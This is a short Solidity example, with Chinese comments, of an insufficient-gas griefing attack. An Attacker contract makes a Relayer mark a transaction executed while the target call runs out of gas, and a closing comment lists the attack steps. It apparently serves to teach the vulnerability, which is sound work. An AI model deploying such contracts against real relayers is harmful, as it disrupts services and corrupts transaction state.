// 高消耗攻擊範例 - 耗盡 Relayer 的 gas 導致交易失敗

// 攻擊者合約
contract Attacker {
    Relayer public relayer;
    
    constructor(address _relayer) {
        relayer = Relayer(_relayer);
    }
    
    // 觸發攻擊的函式
    function attack() external {
        // 創建一個巨大的資料陣列，耗費大量 gas 處理
        bytes memory hugeData = new bytes(100000); // 非常大的資料
        
        // 呼叫 relay 函式但沒有指定足夠的 gas
        // 這將導致 Target 執行時 gas 不足
        relayer.relay(Target(address(this)), hugeData);
    }
    
    // 實現與 Target 同樣的介面，讓 Relayer 可以呼叫
    function execute(bytes memory _data) public {
        // 在這裡執行一個非常昂貴的操作，消耗大量 gas
        for (uint i = 0; i < 1000; i++) {
            // 執行大量的運算和儲存操作
            _wastefulOperation(_data);
        }
    }
    
    // 消耗大量 gas 的函式
    function _wastefulOperation(bytes memory _data) internal {
        // 故意執行昂貴的儲存操作
        bytes32[] memory tmp = new bytes32[](_data.length);
        for (uint i = 0; i < _data.length && i < 100; i++) {
            tmp[i] = keccak256(abi.encodePacked(_data, i));
        }
    }
}

/*
攻擊步驟說明：

1. 攻擊者部署 Attacker 合約並傳入 Relayer 合約的地址。
2. 攻擊者呼叫 attack() 函式。
3. attack() 函式創建一個大型資料陣列並呼叫 Relayer 的 relay() 函式。
4. Relayer 將更新交易計數器並嘗試執行 Target (指向攻擊者合約)。
5. 由於沒有指定或檢查所需的 gas 量，執行會在消耗大量 gas 後失敗。
6. 結果是：
   - 交易 ID 已經增加
   - 交易被標記為已執行
   - 但 execute() 函式執行失敗，因為 gas 不足

這種攻擊利用了 Relayer 合約中缺乏 gas 需求檢查的漏洞，導致交易狀態不一致，
且可能造成合約邏輯錯誤，因為 relay 函式的返回值 (success) 可能為 false，但狀態已經改變。
*/